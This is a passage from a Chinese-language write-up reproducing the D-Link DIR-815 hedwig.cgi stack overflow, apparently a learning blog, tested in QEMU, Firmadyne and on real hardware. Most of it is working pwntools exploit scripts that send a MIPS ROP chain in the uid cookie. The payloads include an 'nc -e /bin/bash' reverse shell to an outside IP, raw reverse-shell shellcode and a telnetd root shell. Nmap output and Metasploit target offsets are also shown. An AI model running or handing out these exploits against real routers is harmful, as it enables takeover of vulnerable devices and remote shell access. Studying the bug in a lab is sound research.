    context.endian = "little"
    context.arch = "mips"
    import requests
    import sys
    def get_payload(offset, libc_base, cmd):
        gadget1 = 0x45988
        gadget2 = 0x159cc
        system_addr_1 = 0x53200-1
        payload = 'A' * offset
        payload += p32(libc_base + system_addr_1) # s0
        payload += p32(libc_base + gadget2)       # s1
        payload += 'A' * 4                        # s2
        payload += 'A' * 4                        # s3
        payload += 'A' * 4                        # s4
        payload += 'A' * 4                        # s5
        payload += 'A' * 4                        # s6
        payload += 'A' * 4                        # s7
        payload += 'A' * 4                        # fp
        payload += p32(libc_base + gadget1)       # ra
        payload += 'B' * 0x10
        payload += cmd
        return payload
    if __name__=="__main__":
        cmd = "nc -e /bin/bash 192.168.79.145 9999"
        cookie='uid=' + get_payload(973, 0x77f34000, cmd)
        header = {
            'Cookie'        : cookie,
            'Content-Type'  : 'application/x-www-form-urlencoded',
            'Content-Length': '100'
            }
        data = {'uid':'1234'}
        ip_port=sys.argv[1]
        url="http://"+ip_port+"/hedwig.cgi"
        r=requests.post(url=url,headers=header,data=data)
        print r.text
测试结果：获取shell
利用sleep调用shellcode(反弹shell)
    #!/usr/bin/python
    from pwn import *
    context.endian = "little"
    context.arch = "mips"
    import requests
    import sys
    def get_payload(offset, libc_base):
        shellcode = ""
        shellcode += "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
        shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
        shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
        shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
        shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
        shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
        #shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337
        shellcode += "\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.79.145
        shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
        shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
        shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
        shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
        shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
        shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"
        sleep = 0x56BD0 #sleep jr ra 0x7678edf4
        gadget1 = 0x57E50
        gadget2 = 0x3B8A8
        gadget3 = 0x14F28
        gadget4 = 0x1DD08#0x15C84#0xBB44
        payload = 'A' * offset #1009-9*4
        payload += 'A' * 4                        # s0
        payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() && move $ra,$(sp+0x24) && jr s2
        payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
        payload += 'A' * 4                        # s3
        payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") && jr shellcode
        payload += 'A' * 4                        # s5
        payload += 'A' * 4                        # s6
        payload += 'A' * 4                        # s7
        payload += 'A' * 4                        # fp
        payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") && jr s1
        payload += 'B' * 0x24 # mipsrop.tail() 0x24B padding
        payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() && move s1,$(sp+0x18) && jr $s4
        payload += 'c' * 0x18 # mipsrop.stackfinder() 0x18B padding
        payload += shellcode
        return payload
    if __name__=="__main__":
        cookie='uid=' + get_payload(973, 0x77f34000)
        header = {
            'Cookie'        : cookie,
            'Content-Type'  : 'application/x-www-form-urlencoded',
            'Content-Length': '100'
            }
        data = {'uid':'1234'}
        ip_port=sys.argv[1]
        url="http://"+ip_port+"/hedwig.cgi"
        r=requests.post(url=url,headers=header,data=data)
        print r.text
测试结果：获取shell
## 利用Firmadyne仿真进行测试
Firmadyne的安装过程这里就不再继续介绍，这里是用它来测试，能够启动起来。并且访问firmadyne给其分配的默认web接口192.168.0.1。
nmap扫描查看开放的端口，目前3各端口分别对应dns53,http80,upnp49152。
    Starting Nmap 7.01 ( https://nmap.org ) at 2020-05-24 16:21 CST
    Nmap scan report for 192.168.0.1
    Host is up (0.00041s latency).
    Not shown: 997 closed ports
    PORT      STATE SERVICE VERSION
    53/tcp    open  domain  dnsmasq 2.45
    80/tcp    open  http    D-Link DIR-815 WAP http config 1.01
    49152/tcp open  upnp    D-Link DIR-815 WAP UPnP 1.01 (UPnP 1.0)
    MAC Address: 52:54:00:12:34:58 (QEMU virtual NIC)
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6.32
    OS details: Linux 2.6.32
    Network Distance: 1 hop
    Service Info: OS: Linux; Device: WAP; CPE: cpe:/h:dlink:dir-815:1.01, cpe:/o:linux:linux_kernel, cpe:/h:d-link:dir-815
构造exp进行测试
其实这里需要跟之前qemu系统模式一样，上传gdbsever进行调试确定偏移和libc基地址。这里直接利用师傅帖子中的代码进行测试。这里的基地址是根据firmadyne中用linux内核版本为2.6.32，别的帖子中测试的基地址为0x2aaf8000，并且metasploit里面的[payload](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb)写到：路由器环境中基地址为0x2aaf8000，qemu环境为0x40854000。两个可以都试试！
    [ 'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600',
                {
                  'Offset'      => 973,
                  'LibcBase'    => 0x2aaf8000,    # Router
                  #'LibcBase'   => 0x40854000,    # QEMU environment
                  'System'      => 0x000531FF,    # address of system
                  'CalcSystem'  => 0x000158C8,    # calculate the correct address of system
                  'CallSystem'  => 0x000159CC,    # call our system
                }
              ]
下面编写exp进行测试，利用system函数进行测试。
    #!/usr/bin/python
    from pwn import *
    context.endian = "little"
    context.arch = "mips"
    import requests
    import sys
    def get_payload(offset, libc_base, cmd):
        gadget1 = 0x45988
        gadget2 = 0x159cc
        system_addr_1 = 0x53200-1
        payload = 'A' * offset
        payload += p32(libc_base + system_addr_1) # s0
        payload += p32(libc_base + gadget2)       # s1
        payload += 'A' * 4                        # s2
        payload += 'A' * 4                        # s3
        payload += 'A' * 4                        # s4
        payload += 'A' * 4                        # s5
        payload += 'A' * 4                        # s6
        payload += 'A' * 4                        # s7
        payload += 'A' * 4                        # fp
        payload += p32(libc_base + gadget1)       # ra
        payload += 'B' * 0x10
        payload += cmd
        return payload
    if __name__=="__main__":
        #cmd = "nc -e /bin/bash 192.168.79.145 9999"
        cmd = 'telnetd -p 222 -l /bin/sh'
        cookie='uid=' + get_payload(973, 0x2aaf8000, cmd)
        header = {
            'Cookie'        : cookie,
            'Content-Type'  : 'application/x-www-form-urlencoded',
            'Content-Length': '100'
            }
        data = {'uid':'1234'}
        ip_port=sys.argv[1]
        url="http://"+ip_port+"/hedwig.cgi"
        r=requests.post(url=url,headers=header,data=data)
        print r.text
测试结果显示能够执行`telnetd -p 222 -l /bin/sh`。telnet 上去对应的窗口直接反弹shell。
# 在实体机上测试
在实体机上刷上1.01的版本，用system方法的exp同样能得到获取shell。
# 总结
到这里，终于分析完了，整个过程其实遇到了不少的坑，从最开始死活到不了第二个sprintf，到后面的qemu系统模式如何修改http配置文件都起不来http服务，还有shellcode的修改等等问题都可能卡好久，最后解决的时候才知道并不是太难的问题。。。还是太菜了！我这都是第二次分析了，才能有个大概的了解，想想一年间的自己到底学到了什么。。。整个流程完全自己复现一遍并且能够很清楚的讲出来，其实个人感觉收获还是很多的，比如路由器缓冲区溢出漏洞的分析调试详细流程，gdb、IDA、Ghidra等工具联调使用，以及该libc的万能gadget等等。  
感谢H4lo大佬的不厌其烦的回答我的问题！坚持学习不断追赶！
# 参考文献
[路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析](https://www.anquanke.com/post/id/179510#h3-8)
[IOT设备漏洞挖掘从入门到入门（二）- DLink Dir
815漏洞分析及三种方式模拟复现](https://www.anquanke.com/post/id/187443#h2-9)
[Building MIPS Environment for Router && PWN](https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell)
[一个mips栈溢出](http://xdxd.love/2016/12/09/一个mips栈溢出利用/)